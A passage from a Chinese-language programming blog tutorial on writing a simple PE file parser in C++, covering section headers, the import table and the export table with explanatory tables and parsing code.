nt_sections_cnt; i++) {<br><br>BYTE* section_name = (BYTE*)<span class="hljs-built_in">malloc</span>(___IMAGE_SIZEOF_SHORT_NAME + <span class="hljs-number">1</span>);<br><span class="hljs-keyword">if</span> (!section_name) {<br><span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">"Error: Section_name malloc failed!\n"</span>);<br><span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>}<br>section_name[___IMAGE_SIZEOF_SHORT_NAME] = <span class="hljs-number">0</span>;<br><span class="hljs-built_in">memcpy</span>(section_name, section_headers[i].Name, ___IMAGE_SIZEOF_SHORT_NAME);<br><br><span class="hljs-built_in">fprintf</span>(stdout, <span class="hljs-string">"  * %s:\n"</span>, section_name);<br><span class="hljs-built_in">fprintf</span>(stdout, <span class="hljs-string">"    - Virtual Address: 0x%X\n"</span>, section_headers[i].VirtualAddress);<br><span class="hljs-comment">// virtual size 是该节区装在到内存的总大小，如果值大于SizeOfRawData则多出的部分用0x00填充</span><br><span class="hljs-built_in">fprintf</span>(stdout, <span class="hljs-string">"    - Virtual Size: 0x%X\n"</span>, section_headers[i].Misc.VirtualSize);<br><span class="hljs-built_in">fprintf</span>(stdout, <span class="hljs-string">"    - Pointer to Raw Data: 0x%X\n"</span>, section_headers[i].PointerToRawData);<br><span class="hljs-built_in">fprintf</span>(stdout, <span class="hljs-string">"    - Raw Data's Size: 0x%X\n"</span>, section_headers[i].SizeOfRawData);<br><span class="hljs-built_in">fprintf</span>(stdout, <span class="hljs-string">"    - Characteristics: 0x%X\n\n"</span>, section_headers[i].Characteristics);<br><br>}<br><br><span class="hljs-built_in">fprintf</span>(stdout, <span class="hljs-string">"\n==========END=========\n\n"</span>);<br><br>}<br></code></pre></td></tr></tbody></table></figure><ul><li>运行结果：</li></ul><p><img src="/2023/08/03/%E4%B8%80%E6%AD%A5%E4%B8%80%E6%AD%A5%E6%89%8B%E6%90%93%E4%B8%80%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84PE%E8%A7%A3%E6%9E%90%E5%99%A8/9.png"></p><hr><h3 id="本节小结"><a href="#本节小结" class="headerlink" title="本节小结"></a>本节小结</h3><ul><li>本节主要解析了PE32文件的头部信息，包括<code>DOS Header</code>、<code>Rish Headers</code>、<code>NT Headers</code>和<code>Section Headers</code>，并通过这种解析的过程了解了PE文件的结构，如下图所示：</li></ul><p><img src="/2023/08/03/%E4%B8%80%E6%AD%A5%E4%B8%80%E6%AD%A5%E6%89%8B%E6%90%93%E4%B8%80%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84PE%E8%A7%A3%E6%9E%90%E5%99%A8/10.png"></p><ul><li>此外还剩下需要具体分析的是Section信息，我们将在下一节中详细介绍</li></ul><h2 id="Step-3-解析Sections"><a href="#Step-3-解析Sections" class="headerlink" title="Step 3: 解析Sections"></a>Step 3: 解析Sections</h2><ul><li>PE文件的Sections包括[12]：</li></ul><table><thead><tr><th align="left">Section Name</th><th align="left">Content</th><th align="left">Characteristics</th></tr></thead><tbody><tr><td align="left">.bss</td><td align="left">未初始化数据(free format)</td><td align="left">IMAGE_SCN_CNT_UNINITIALIZED_DATA | IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_WRITE</td></tr><tr><td align="left">.cormeta</td><td align="left">CLR metadata that indicates that the object file contains managed code</td><td align="left">IMAGE_SCN_LNK_INFO</td></tr><tr><td align="left">.data</td><td align="left">已初始化数据(free format)</td><td align="left">IMAGE_SCN_CNT_INITIALIZED_DATA | IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_WRITE</td></tr><tr><td align="left">.debug$F</td><td align="left">Generated FPO debug information (object only, x86 architecture only, and now obsolete)</td><td align="left">IMAGE_SCN_CNT_INITIALIZED_DATA | IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_DISCARDABLE</td></tr><tr><td align="left">.debug$P</td><td align="left">Precompiled debug types (object only)</td><td align="left">IMAGE_SCN_CNT_INITIALIZED_DATA | IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_DISCARDABLE</td></tr><tr><td align="left">.debug$S</td><td align="left">Debug symbols (object only)</td><td align="left">IMAGE_SCN_CNT_INITIALIZED_DATA | IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_DISCARDABLE</td></tr><tr><td align="left">.debug$T</td><td align="left">Debug types (object only)</td><td align="left">IMAGE_SCN_CNT_INITIALIZED_DATA | IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_DISCARDABLE</td></tr><tr><td align="left">.drective</td><td align="left">Linker options</td><td align="left">IMAGE_SCN_LNK_INFO</td></tr><tr><td align="left">.edata</td><td align="left">导出表</td><td align="left">IMAGE_SCN_CNT_INITIALIZED_DATA | IMAGE_SCN_MEM_READ</td></tr><tr><td align="left">.idata</td><td align="left">导入表</td><td align="left">IMAGE_SCN_CNT_INITIALIZED_DATA | IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_WRITE</td></tr><tr><td align="left">.idlsym</td><td align="left">Includes registered SEH (image only) to support IDL attributes. For information, see “IDL Attributes” in <a href="https://learn.microsoft.com/en-us/windows/win32/debug/pe-format#references">References</a> at the end of this topic.</td><td align="left">IMAGE_SCN_LNK_INFO</td></tr><tr><td align="left">.pdata</td><td align="left">异常信息</td><td align="left">IMAGE_SCN_CNT_INITIALIZED_DATA | IMAGE_SCN_MEM_READ</td></tr><tr><td align="left">.rdata</td><td align="left">只读的已初始化数据</td><td align="left">IMAGE_SCN_CNT_INITIALIZED_DATA | IMAGE_SCN_MEM_READ</td></tr><tr><td align="left">.reloc</td><td align="left">镜像重定向</td><td align="left">IMAGE_SCN_CNT_INITIALIZED_DATA | IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_DISCARDABLE</td></tr><tr><td align="left">.rsrc</td><td align="left">资源目录</td><td align="left">IMAGE_SCN_CNT_INITIALIZED_DATA | IMAGE_SCN_MEM_READ</td></tr><tr><td align="left">.sbss</td><td align="left">GP-relative uninitialized data (free format)</td><td align="left">IMAGE_SCN_CNT_UNINITIALIZED_DATA | IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_WRITE | IMAGE _SCN_GPREL The IMAGE_SCN_GPREL flag should be set for IA64 architectures only; this flag is not valid for other architectures. The IMAGE_SCN_GPREL flag is for object files only; when this section type appears in an image file, the IMAGE_SCN_GPREL flag must not be set.</td></tr><tr><td align="left">.sdata</td><td align="left">GP-relative initialized data (free format)</td><td align="left">IMAGE_SCN_CNT_INITIALIZED_DATA | IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_WRITE | IMAGE _SCN_GPREL The IMAGE_SCN_GPREL flag should be set for IA64 architectures only; this flag is not valid for other architectures. The IMAGE_SCN_GPREL flag is for object files only; when this section type appears in an image file, the IMAGE_SCN_GPREL flag must not be set.</td></tr><tr><td align="left">.srdata</td><td align="left">GP-relative read-only data (free format)</td><td align="left">IMAGE_SCN_CNT_INITIALIZED_DATA | IMAGE_SCN_MEM_READ | IMAGE _SCN_GPREL The IMAGE_SCN_GPREL flag should be set for IA64 architectures only; this flag is not valid for other architectures. The IMAGE_SCN_GPREL flag is for object files only; when this section type appears in an image file, the IMAGE_SCN_GPREL flag must not be set.</td></tr><tr><td align="left">.sxdata</td><td align="left">Registered exception handler data (free format and x86/object only)</td><td align="left">IMAGE_SCN_LNK_INFO Contains the symbol index of each of the exception handlers being referred to by the code in that object file. The symbol can be for an UNDEF symbol or one that is defined in that module.</td></tr><tr><td align="left">.text</td><td align="left">可执行汇编码 (free format)</td><td align="left">IMAGE_SCN_CNT_CODE | IMAGE_SCN_MEM_EXECUTE | IIMAGE_SCN_MEM_READ</td></tr><tr><td align="left">.tls</td><td align="left">线程局部存储(object only)</td><td align="left">IMAGE_SCN_CNT_INITIALIZED_DATA | IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_WRITE</td></tr><tr><td align="left">.tls$</td><td align="left">Thread-local storage (object only)</td><td align="left">IMAGE_SCN_CNT_INITIALIZED_DATA | IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_WRITE</td></tr><tr><td align="left">.vsdata</td><td align="left">GP-relative initialized data (free format and for ARM, SH4, and Thumb architectures only)</td><td align="left">IMAGE_SCN_CNT_INITIALIZED_DATA | IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_WRITE</td></tr><tr><td align="left">.xdata</td><td align="left">Exception information (free format)</td><td align="left">IMAGE_SCN_CNT_INITIALIZED_DATA | IMAGE_SCN_MEM_READ</td></tr></tbody></table><ul><li>接下来我们将解析Sections中比较重要的几个Section的数据</li></ul><h3 id="Step-3-1-解析PE导入表（-idata）"><a href="#Step-3-1-解析PE导入表（-idata）" class="headerlink" title="Step 3.1: 解析PE导入表（.idata）"></a>Step 3.1: 解析PE导入表（.idata）</h3><ul><li><p><code>.idata</code>节存储着所有的导入符号，其包含下面几个内容[13]：</p><ul><li><p><strong>导入目录表</strong></p><p>Null 目录条目</p></li><li><p>DLL1 导入查找表</p><p>Null</p></li><li><p>DLL2 导入查找表</p><p>Null</p></li><li><p>DLL3 导入查找表</p><p>Null</p></li><li><p>提示/名称表</p></li></ul></li></ul><hr><p><strong>1. 导入目录表</strong></p><ul><li>导入目录表的每一个字段的含义：</li></ul><table><thead><tr><th>偏移</th><th>大小</th><th>字段名</th><th>描述</th></tr></thead><tbody><tr><td>0</td><td>4</td><td>导入查找表的RVA<br><strong>Import Lookup Table RVA<br>（Characteristics）</strong></td><td>导入查找表ILT的RVA，该表包含每一个导入的名字或序号</td></tr><tr><td>4</td><td>4</td><td>时间/日期戳<br><strong>Time/Date Stamp</strong></td><td>在镜像被绑定前该字段设置为0，在绑定之后该字段设置为DLL的时间/日期戳</td></tr><tr><td>8</td><td>4</td><td>转发链<br><strong>Forwarder Chain</strong></td><td>第一个转发器引用的索引</td></tr><tr><td>12</td><td>4</td><td>名字的RVA<br><strong>Name RVA</strong></td><td>包含该DLL名字的ASCII字符串地址，该地址相对于镜像基址</td></tr><tr><td>16</td><td>4</td><td>导入地址表RVA<br><strong>Import Address Table RVA (Thunk Table)</strong></td><td>导入地址表IAT的RVA，在镜像被绑定之前，该表的内容与导入查找表ILT内容相同</td></tr></tbody></table><p><strong>2. 导入查找表ILT</strong></p><ul><li>对于PE32来说，该表是一个32位数字的数组；对于PE32+来说，该表是64位数字的数组</li><li>布局[13]：</li></ul><table><thead><tr><th align="left">Bit(s)</th><th align="left">Size</th><th align="left">Bit field</th><th align="left">Description</th></tr></thead><tbody><tr><td align="left">31/63</td><td align="left">1</td><td align="left">Ordinal/Name Flag</td><td align="left">If this bit is set, import by ordinal. Otherwise, import by name. Bit is masked as 0x80000000 for PE32, 0x8000000000000000 for PE32+.</td></tr><tr><td align="left">15-0</td><td align="left">16</td><td align="left">Ordinal Number</td><td align="left">A 16-bit ordinal number. This field is used only if the Ordinal/Name Flag bit field is 1 (import by ordinal). Bits 30-15 or 62-15 must be 0.</td></tr><tr><td align="left">30-0</td><td align="left">31</td><td align="left">Hint/Name Table RVA</td><td align="left">A 31-bit RVA of a hint/name table entry. This field is used only if the Ordinal/Name Flag bit field is 0 (import by name). For PE32+ bits 62-31 must be zero.</td></tr></tbody></table><p><strong>3. 提示/名称表：Hint/Name Table</strong></p><ul><li>布局[13]：</li></ul><table><thead><tr><th>偏移</th><th>大小</th><th>字段名</th><th>描述</th></tr></thead><tbody><tr><td>0</td><td>2</td><td>提示</td><td>导出名称指针表的索引</td></tr><tr><td>2</td><td>-</td><td>名称</td><td>导入名称ASCII字符串</td></tr><tr><td>*</td><td>0 or 1</td><td>填充</td><td></td></tr></tbody></table><p><strong>4. 导入地址表IAT</strong></p><ul><li>在镜像被绑定之前，IAT中的结构和内容与ILT相同</li><li>在镜像被绑定之后，IAT中的实体被重写为需要导入的32位/64位的符号地址，i.e. <strong>该表在运行时会被PE加载器重写</strong></li></ul><hr><ul><li><p>解析流程：</p><ul><li>在Step 2.3节中，我们解析了<code>NT Headers</code>中的<code>Data Directory</code>字段，而该字段中就存储了<code>Import Directory</code>的相对虚拟地址RVA，我们需要将其转换为文件中的偏移地址</li><li>RVA –&gt; RAW：<ol><li>首先应该遍历所有节区，找到该RVA属于哪一个节区</li><li><code>Section Headers</code>记录了各个Section的<code>Virtual Address</code>和<code>Pointer to Raw Data</code>，该地址<strong>在文件中的偏移RAW = RVA - Section’s Virtual Address + Pointer to Raw Data</strong>（我们将该功能封装到一个函数中）</li><li>读取并解析RAW中的数据</li></ol></li><li>举例：我们假设导入目录表的RVA为0x1D1F4，<code>.idata</code>的<code>Virtual Address</code>为 0x1D000且大小为0xBE7，因此该RVA在<code>.idata</code>段内；然后，我们根据<code>.idata</code>的<code>Pointer to Raw Data</code>值0xA800，找到该导入目录表在文件中的偏移值为0xA800+（0x1D1F4-0x1D000）= <strong>0xA9F4</strong></li><li>导入目录表实体数可以由<code>Import Directory</code>的大小除以20字节得到，请注意最后一个实体为全0填充</li></ul></li><li><p>处理代码：</p></li></ul><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">PE32::parse_import_directory</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>{<br><br>DWORD raw_offset, entry_num, read_size;<br><br><span class="hljs-comment">// 先检查import_dir_table_size的合法性，拒绝非法PE文件</span><br><span class="hljs-keyword">if</span> (import_dir_table_size % <span class="hljs-built_in">sizeof</span>(___IMAGE_IMPORT_DESCRIPTOR) != <span class="hljs-number">0</span>) {<br><span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">"Error: Wrong Import Directory size. Bad PE file!\n"</span>);<br><span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>}<br><br>entry_num = import_dir_table_size / <span class="hljs-built_in">sizeof</span>(___IMAGE_IMPORT_DESCRIPTOR);<br><span class="hljs-comment">// 这里需要注意一下，导入目录表最后一个实体为全0填充</span><br><span class="hljs-comment">// 这里其实没必要读取最后一个实体的内容</span><br>entry_num = entry_num - <span class="hljs-number">1</span>;<br><br><span class="hljs-keyword">if</span> (entry_num &gt; <span class="hljs-number">0xffff</span>) {<br><span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">"Error: Too many import entries!"</span>);<br><span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>}<br><br>raw_offset = <span class="hljs-built_in">va_to_raw</span>(import_dir_table_rva);<br><span class="hljs-built_in">fseek</span>(pe_fp, raw_offset, SEEK_SET);<br><br>import_dir_table_entries = (___PIMAGE_IMPORT_DESCRIPTOR)<span class="hljs-built_in">malloc</span>(<span class="hljs-built_in">sizeof</span>(___IMAGE_IMPORT_DESCRIPTOR) * entry_num);<br><span class="hljs-keyword">if</span> (!import_dir_table_entries) {<br><span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">"Error: Import_dir_table malloc failed!\n"</span>);<br><span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>}<br>read_size = <span class="hljs-built_in">fread</span>(import_dir_table_entries, <span class="hljs-built_in">sizeof</span>(___IMAGE_IMPORT_DESCRIPTOR), entry_num, pe_fp);<br><br><span class="hljs-keyword">if</span> (read_size != entry_num) {<br><span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">"Error: Bad PE file!\n"</span>);<br><span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>}<br><br>import_dir_table_entries_num = entry_num;<br><br>}<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">PE32::print_import_table_info</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>{<br><br>DWORD i, j, name_size, name_rva;<br><span class="hljs-type">char</span>* name_tmp, ch = <span class="hljs-number">1</span>;<br>___IMAGE_IMPORT_BY_NAME hint;<br><br><span class="hljs-built_in">fprintf</span>(stdout, <span class="hljs-string">"======Import table====\n\n"</span>);<br><br><span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; import_dir_table_entries_num; i++) {<br><br>name_rva = import_dir_table_entries[i].Name;<br><span class="hljs-built_in">fseek</span>(pe_fp, <span class="hljs-built_in">va_to_raw</span>(name_rva), SEEK_SET);<br><br><span class="hljs-comment">// 确定名字的长度</span><br>name_size = <span class="hljs-number">0</span>;<br>ch = <span class="hljs-built_in">fgetc</span>(pe_fp);<br><span class="hljs-keyword">while</span> (ch != EOF &amp;&amp; ch != <span class="hljs-number">0</span>) {<br><span class="hljs-keyword">if</span> (++name_size &gt; <span class="hljs-number">256</span>) { <br><span class="hljs-comment">// 拒绝名称大于256的DLL名字（对非法PE的检查）</span><br><span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">"Error: DLL's name too long?!\n"</span>);<br><span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>}<br>ch = <span class="hljs-built_in">fgetc</span>(pe_fp);<br>}<br><br>name_tmp = (<span class="hljs-type">char</span>*)<span class="hljs-built_in">malloc</span>(name_size + <span class="hljs-number">1</span>);<br><span class="hljs-keyword">if</span> (!name_tmp) {<br><span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">"Error: Name_tmp malloc failed!\n"</span>);<br><span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>}<br>name_tmp[name_size] = <span class="hljs-number">0</span>;<br><span class="hljs-built_in">fseek</span>(pe_fp, <span class="hljs-built_in">va_to_raw</span>(name_rva), SEEK_SET);<br><span class="hljs-built_in">fread</span>(name_tmp, <span class="hljs-built_in">sizeof</span>(<span class="hljs-type">char</span>), name_size, pe_fp);<br><span class="hljs-built_in">fprintf</span>(stdout, <span class="hljs-string">"  * %s:\n\n"</span>, name_tmp);<br><span class="hljs-built_in">free</span>(name_tmp);<br><span class="hljs-built_in">fprintf</span>(stdout, <span class="hljs-string">"    - Import Lookup Table (ILT): 0x%X (RVA), 0x%X (RAW)\n"</span>,<br>import_dir_table_entries[i].DUMMYUNIONNAME.OriginalFirstThunk,<br><span class="hljs-built_in">va_to_raw</span>(import_dir_table_entries[i].DUMMYUNIONNAME.OriginalFirstThunk));<br><span class="hljs-built_in">fprintf</span>(stdout, <span class="hljs-string">"    - Import Address Table (IAT): 0x%X (RVA), 0x%X (RAW)\n"</span>,<br>import_dir_table_entries[i].FirstThunk,<br><span class="hljs-built_in">va_to_raw</span>(import_dir_table_entries[i].FirstThunk));<br><span class="hljs-built_in">fprintf</span>(stdout, <span class="hljs-string">"    - Bound?: %s\n"</span>, import_dir_table_entries[i].TimeDateStamp ? <span class="hljs-string">"TRUE"</span> : <span class="hljs-string">"FALSE"</span>);<br><br><br><span class="hljs-comment">// ILT和IAT值在PE加载前是一样的，随便读取哪一个都行</span><br><span class="hljs-comment">// 解析具体函数名</span><br>    <span class="hljs-comment">// https://learn.microsoft.com/zh-cn/windows/win32/debug/pe-format#the-idata-section</span><br><br><span class="hljs-built_in">fprintf</span>(stdout, <span class="hljs-string">"    - Entries: \n\n"</span>);<br><br><span class="hljs-keyword">for</span> (j = <span class="hljs-number">0</span>; ; j++) {<br><span class="hljs-built_in">fseek</span>(pe_fp, <span class="hljs-built_in">va_to_raw</span>(import_dir_table_entries[i].FirstThunk + j * <span class="hljs-built_in">sizeof</span>(DWORD)), SEEK_SET);<br><span class="hljs-built_in">fread</span>(&amp;name_rva, <span class="hljs-built_in">sizeof</span>(DWORD), <span class="hljs-number">1</span>, pe_fp);<br><span class="hljs-keyword">if</span> (name_rva == <span class="hljs-number">0</span>) <span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">if</span> (!(name_rva &amp; <span class="hljs-number">0x80000000</span>)) {<br><span class="hljs-built_in">fseek</span>(pe_fp, <span class="hljs-built_in">va_to_raw</span>(name_rva), SEEK_SET);<br><span class="hljs-built_in">fread</span>(&amp;hint, <span class="hljs-built_in">sizeof</span>(___IMAGE_IMPORT_BY_NAME), <span class="hljs-number">1</span>, pe_fp);<br>hint.Name[<span class="hljs-number">99</span>] = <span class="hljs-number">0</span>; <span class="hljs-comment">// 防止越界读</span><br><span class="hljs-built_in">fprintf</span>(stdout, <span class="hljs-string">"       [%02d] Name: %s\n            Hint: 0x%X\n            Call via: 0x%X (RVA)\n"</span>,<br>j + <span class="hljs-number">1</span>, hint.Name, hint.Hint, <br>import_dir_table_entries[i].FirstThunk + j * <span class="hljs-built_in">sizeof</span>(DWORD));<br>}<br><span class="hljs-keyword">else</span> {<br><span class="hljs-comment">// 按照序号导入</span><br><span class="hljs-built_in">fprintf</span>(stdout, <span class="hljs-string">"       [%d] Ordinal: 0x%X\n"</span>, j + <span class="hljs-number">1</span>, name_rva &amp; <span class="hljs-number">0xffff</span>);<br>}<br>}<br><span class="hljs-built_in">fprintf</span>(stdout, <span class="hljs-string">"\n"</span>);<br>}<br><br><span class="hljs-built_in">fprintf</span>(stdout, <span class="hljs-string">"\n==========END=========\n\n"</span>);<br><br>}<br></code></pre></td></tr></tbody></table></figure><ul><li>运行结果：</li></ul><p><img src="/2023/08/03/%E4%B8%80%E6%AD%A5%E4%B8%80%E6%AD%A5%E6%89%8B%E6%90%93%E4%B8%80%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84PE%E8%A7%A3%E6%9E%90%E5%99%A8/11.png"></p><h3 id="Step-3-2-解析PE导出表（-edata）"><a href="#Step-3-2-解析PE导出表（-edata）" class="headerlink" title="Step 3.2: 解析PE导出表（.edata）"></a>Step 3.2: 解析PE导出表（.edata）</h3><ul><li><code>.edata</code>包含有关其他镜像可以通过动态链接访问的符号信息，通常包含在DLL中[14]。</li></ul><table><thead><tr><th align="left">表名称</th><th align="left">说明</th></tr></thead><tbody><tr><td align="left">导出目录表</td><td align="left">只有一行的表（与调试目录不同）。 此表指示其他导出表的位置和大小。</td></tr><tr><td align="left">导出地址表</td><td align="left">导出符号的 RVA 数组。 这些是可执行代码和数据节中的导出函数和数据的实际地址。 其他映像文件可以使用此表的索引（序号）或者（可选）使用与序号对应的公共名称（如果定义了公共名称）导入符号。</td></tr><tr><td align="left">名称指针表</td><td align="left">指向公共导出名称的指针数组，按升序排序。</td></tr><tr><td align="left">序号表</td><td align="left">对应于名称指针表的成员的序号数组。 对应关系按位置，因此，名称指针表和序号表的成员数必须相同。 每个序号都是导出地址表中的索引。</td></tr><tr><td align="left">导出名称表</td><td align="left">一系列以 null 结尾的 ASCII 字符串。 名称指针表的成员指向此区域。 这些名称是用于导入和导出符号的公共名称，它们不一定与映像文件中使用的专用名称相同。</td></tr></tbody></table><hr><p><strong>1. 导出目录表</strong></p><ul><li>字段如下所示[14]，其中重要的字段已加粗处理：</li></ul><table><thead><tr><th align="left">偏移量</th><th align="left">大小</th><th align="left">字段</th><th align="left">说明</th></tr></thead><tbody><tr><td align="left">0</td><td align="left">4</td><td align="left">导出标志</td><td align="left">保留，必须为 0。</td></tr><tr><td align="left">4</td><td align="left">4</td><td align="left">时间/日期戳</td><td align="left">创建导出数据的时间和日期。</td></tr><tr><td align="left">8</td><td align="left">2</td><td align="left">主要版本</td><td align="left">主版本号。 用户可以设置主要版本号和次要版本号。</td></tr><tr><td align="left">10</td><td align="left">2</td><td align="left">次要版本</td><td align="left">次版本号。</td></tr><tr><td align="left">12</td><td align="left">4</td><td align="left"><strong>名称 RVA</strong></td><td align="left">包含 DLL 名称的 ASCII 字符串的地址。 此地址相对于映像基址。</td></tr><tr><td align="left">16</td><td align="left">4</td><td align="left"><strong>序号基</strong></td><td align="left">此映像中的导出的起始序号。 此字段指定导出地址表的起始序号。 <strong>通常设置为 1。</strong></td></tr><tr><td align="left">20</td><td align="left">4</td><td align="left"><strong>地址表条目</strong></td><td align="left">导出地址表中的条目数。</td></tr><tr><td align="left">24</td><td align="left">4</td><td align="left"><strong>名称指针数</strong></td><td align="left">名称指针表中的条目数。 也是序号表中的条目数。</td></tr><tr><td align="left">28</td><td align="left">4</td><td align="left"><strong>导出地址表 RVA</strong></td><td align="left">导出地址表相对于映像基址的地址。</td></tr><tr><td align="left">32</td><td align="left">4</td><td align="left"><strong>名称指针 RVA</strong></td><td align="left">导出名称指针表相对于映像基址的地址。 表大小由“名称指针数”字段给出。</td></tr><tr><td align="left">36</td><td align="left">4</td><td align="left"><strong>序号表RVA</strong></td><td align="left">序号表相对于映像基址的地址。</td></tr></tbody></table><p><strong>2. 导出地址表EAT</strong></p><ul><li>可以把EAT理解为一个存放导出地址的RVA数组（4字节为一个RVA），然后根据RVA去找到具体符号的导出地址</li></ul><table><thead><tr><th align="left">偏移</th><th align="left">大小</th><th align="left">字段</th><th align="left">说明</th></tr></thead><tbody><tr><td align="left">0</td><td align="left">4</td><td align="left">导出RVA</td><td align="left">加载到内存中时导出符号相对于映像基址的地址。 例如，<strong>导出函数的地址</strong>。</td></tr><tr><td align="left">0</td><td align="left">4</td><td align="left">转发器 RVA</td><td align="left">指向导出节中以 null 结尾的 ASCII 字符串的指针。 此字符串必须在导出表数据目录条目给定的范围内。</td></tr></tbody></table><p><strong>3. 名称指针RVA</strong></p><ul><li>这个也是一个存放名称字符串RVA（4字节）的数组，这个数组是乱序的，如果要恢复其顺序，则需要使用序号表RVA中的信息</li></ul><p><strong>4. 序号表</strong></p><ul><li><p>序号表顺序与名称指针表顺序一致，与导出地址表顺序不一致，需要根据序号表进行恢复。</p></li><li><p>存储符号顺序的表，为<strong>16位</strong>无偏索引数组；这里需要注意的是，真正的（biased）序号等于导出目录表中的序号基 + 该16位无偏值</p></li><li><p>举个例子，序号表第一个16位为03，而相应的名称指针数组第一个RVA所表示的字符串<code>AboutDlgProc</code>，序号基为01，那么上述信息可表述为序号04的函数为<code>AboutDlgProc</code>，其导出地址为导出地址表中第<strong>4</strong>个值 <code>9840</code>。</p></li><li><p>图解整个寻址流程：</p></li></ul><p><img src="/2023/08/03/%E4%B8%80%E6%AD%A5%E4%B8%80%E6%AD%A5%E6%89%8B%E6%90%93%E4%B8%80%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84PE%E8%A7%A3%E6%9E%90%E5%99%A8/1.svg"></p><hr><ul><li><p>解析流程：</p><ul><li><p>先解析导出目录表，得到导出表的名称指针，并取得其名称；</p></li><li><p>其次，由于导出表项的序号是乱序的，因此我们构建了一个导出表项的实体用来存储导出表项的内容，如下：</p><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">struct</span> <span class="hljs-title class_">__EXPORT_ENTRY</span> {<br>WORD  ordinal;<br>DWORD function_rva;<br>DWORD name_rva;<br><span class="hljs-type">char</span>  name[<span class="hljs-number">100</span>];<br>}EXPORT_ENTRY, *PEXPORT_ENTRY;<br></code></pre></td></tr></tbody></table></figure></li><li><p>然后，我们根据导出表项的地址表条目数[<code>NumberOfFunctions</code>]来创建指定个数的导出表项实体，并根据导出目录表中的名称指针表和序号表的内容找到指定的导出表实体，并更新其字段内容；</p></li><li><p>最后，将更新后的导出表实体按照ordinal的顺序打印出来</p></li></ul></li><li><p>处理代码：</p></li></ul><figure class="highlight 